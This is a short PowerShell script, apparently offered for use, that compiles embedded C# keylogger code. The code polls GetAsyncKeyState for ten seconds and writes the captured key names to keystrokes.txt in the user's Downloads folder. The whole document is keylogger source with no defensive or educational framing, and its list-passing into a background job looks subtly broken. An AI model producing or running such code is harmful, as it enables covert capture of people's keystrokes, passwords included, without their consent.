# Initialize an empty list to store the keystrokes
$keystrokes = @()

# Keylogger C# Code
$signature = @'
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Threading;
public class Logger {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);

    public static void Start(ref System.Collections.Generic.List<string> keystrokes, int durationInSeconds) {
        DateTime endTime = DateTime.Now.AddSeconds(durationInSeconds);
        while (DateTime.Now < endTime) {
            Thread.Sleep(10);
            for (int i = 8; i <= 190; i++) {
                if (GetAsyncKeyState(i) == -32767) {
                    string key = ((Keys)i).ToString();
                    keystrokes.Add(key);
                }
            }
        }
        
        // Save the keystrokes to the Downloads folder
        string downloadsPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads";
        string logFile = Path.Combine(downloadsPath, "keystrokes.txt");
        File.WriteAllLines(logFile, keystrokes);
    }
}
'@

# Compile and start the keylogger
Add-Type -TypeDefinition $signature -Language CSharp
Start-Job -ScriptBlock { [Logger]::Start($using:keystrokes, 10) }
